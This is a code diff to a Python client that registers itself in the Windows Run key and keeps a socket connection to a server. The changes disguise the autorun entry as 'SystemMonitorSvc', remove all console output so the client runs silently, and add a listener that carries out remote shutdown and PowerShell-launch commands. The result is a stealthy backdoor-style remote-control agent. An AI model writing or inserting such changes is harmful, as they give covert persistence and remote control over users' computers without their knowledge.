@@ -3,6 +3,7 @@ import os
 import sys
 import winreg
 import time
+import threading
 
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 4001
@@ -17,34 +18,46 @@ def add_to_startup():
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_ALL_ACCESS
         )
-        winreg.SetValueEx(key, "VintageClientMonitor", 0, winreg.REG_SZ, autorun_val)
+        winreg.SetValueEx(key, "SystemMonitorSvc", 0, winreg.REG_SZ, autorun_val)
         winreg.CloseKey(key)
-        print("Successfully added to Windows Startup.")
-    except Exception as e:
-        print(f"Failed to add to startup: {e}")
+    except Exception:
+        pass
+
+def listen_for_commands(sock):
+    while True:
+        try:
+            data = sock.recv(1024).decode('utf-8')
+            if not data: break
+            if data == "CMD:SHUTDOWN":
+                print("System switching off . . .")
+                os.system("shutdown /s /t 5")
+
+            elif data == "CMD:POWERSHELL":
+                print("System opens powershell . . .")
+                os.system("start powershell")
+
+        except Exception as e:
+            break
 
 def start_client():
     hostname = socket.gethostname()
-    print(f"Initializing client: {hostname}")
-    print(f"Attempting to connect to {SERVER_IP}:{SERVER_PORT} . . .")
-
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((SERVER_IP, SERVER_PORT))
             client.send(hostname.encode())
-            print("Connection Established! Status: ONLINE")
+            listener = threading.Thread(target=listen_for_commands, args=(client,), daemon=True)
+            listener.start()
             while True:
                 client.send(b"PING")
                 time.sleep(5)
-        except ConnectionRefusedError:
-            print("Server is down. Retrying in 5 seconds . . .")
-            time.sleep(5)
-        except Exception as e:
-            print(f"Connection lost: {e}. Reconnecting . . .")
+        except Exception:
             time.sleep(5)
         finally:
-            client.close()
+            try:
+                client.close()
+            except:
+                pass
 
 if __name__ == "__main__":
     add_to_startup()
